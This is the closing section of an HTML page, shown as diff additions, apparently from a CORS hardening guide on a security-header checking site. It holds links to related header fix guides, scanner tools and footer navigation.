+    <p>CORS is one of several security header and configuration topics HardenCheck covers &mdash; here are guides for the others:</p>
+    <div class="suite">
+      <a href="add-content-security-policy-header.html">
+        <span class="s-tag">Fix guide</span>
+        <span class="s-name">Add a CSP header</span>
+        <p>Write a Content-Security-Policy that blocks XSS without breaking your site &mdash; with report-only mode, nonces, hashes, and platform snippets.</p>
+      </a>
+      <a href="enable-hsts-header.html">
+        <span class="s-tag">Fix guide</span>
+        <span class="s-name">Enable HSTS</span>
+        <p>Force HTTPS at the browser level &mdash; so attackers can&rsquo;t strip the connection even if a visitor types http://.</p>
+      </a>
+      <a href="permissions-policy-header.html">
+        <span class="s-tag">Fix guide</span>
+        <span class="s-name">Permissions-Policy</span>
+        <p>Deny camera, microphone, geolocation, and other browser APIs your site doesn&rsquo;t need &mdash; including in third-party iframes and compromised scripts.</p>
+      </a>
+      <a href="referrer-policy-header.html">
+        <span class="s-tag">Fix guide</span>
+        <span class="s-name">Referrer-Policy</span>
+        <p>Control what URL data leaks to external sites every time a visitor clicks a link or loads a resource.</p>
+      </a>
+      <a href="https://labs.copperbaytech.com/leakcheck/" target="_blank" rel="noopener noreferrer">
+        <span class="s-tag">Secret scanning</span>
+        <span class="s-name">LeakCheck</span>
+        <p>Paste code or a config file and see exposed API keys and secrets flagged before they reach the repo.</p>
+      </a>
+      <a href="https://labs.copperbaytech.com/hardencheck/" target="_blank" rel="noopener noreferrer">
+        <span class="s-tag">Header scanner</span>
+        <span class="s-name">HardenCheck</span>
+        <p>Paste your site&rsquo;s response headers and get an instant security grade with fix guidance for every flagged header.</p>
+      </a>
+    </div>
+  </div>
+</article>
+</main>
+
+<footer class="footer" role="contentinfo">
+  <div class="wrap foot">
+    <div>
+      <a class="brand small" href="../" aria-label="HardenCheck &mdash; homepage">
+        <svg class="mark" viewBox="0 0 64 64" aria-hidden="true">
+          <path d="M32 4 54 12 V30 C54 44 45 54 32 60 C19 54 10 44 10 30 V12 Z" fill="#cbd2da"/>
+          <path d="M32 10 48 16 V30 C48 41 41.5 49 32 54 C22.5 49 16 41 16 30 V16 Z" fill="#14181f"/>
+          <rect x="23" y="22" width="18" height="3.4" rx="1.7" fill="#faf8f4"/>
+          <rect x="23" y="29" width="13" height="3.4" rx="1.7" fill="#7d8893"/>
+          <path d="M24 37.5 L30 43.5 L42 31.5" fill="none" stroke="#bf6b3c" stroke-width="5" stroke-linecap="round" stroke-linejoin="round"/>
+        </svg>
+        <span class="wordmark">HardenCheck</span>
+      </a>
+      <p class="fine">A header &amp; cookie hardening check &mdash; not a full security audit or guarantee.</p>
+    </div>
+    <nav class="foot-nav" aria-label="Footer navigation">
+      <a href="../about.html">How it works</a>
+      <a href="add-content-security-policy-header.html">CSP basics</a>
+      <a href="content-security-policy-strict-dynamic.html">strict-dynamic guide</a>
+      <a href="csp-react-spa-app.html">React / SPA guide</a>
+      <a href="enable-hsts-header.html">HSTS guide</a>
+      <a href="x-frame-options-vs-csp-frame-ancestors.html">X-Frame-Options guide</a>
+      <a href="x-content-type-options-nosniff.html">X-Content-Type-Options</a>
+      <a href="referrer-policy-header.html">Referrer-Policy guide</a>
+      <a href="permissions-policy-header.html">Permissions-Policy guide</a>
+      <a href="fix-cors-misconfiguration.html">CORS guide</a>
+      <a href="https://labs.copperbaytech.com/shipsafe/" target="_blank" rel="noopener noreferrer">ShipSafe</a>
+      <a href="https://labs.copperbaytech.com/leakcheck/" target="_blank" rel="noopener noreferrer">LeakCheck</a>
+      <a href="https://labs.copperbaytech.com/exposurecheck/" target="_blank" rel="noopener noreferrer">ExposureCheck</a>
+      <a href="https://labs.copperbaytech.com/depcheck/" target="_blank" rel="noopener noreferrer">DepCheck</a>
+      <a href="https://copperbaytech.com" target="_blank" rel="noopener noreferrer">Secure my project &rarr;</a>
+    </nav>
+  </div>
+  <div class="wrap">
+    <p class="madeby">A <a href="https://copperbaytech.com" target="_blank" rel="noopener noreferrer">Copper Bay Labs</a> product.
+    <span class="disclaimer">This is a free hardening tool, not professional security advice.</span></p>
+  </div>
+</footer>
+
+</body>
+</html>
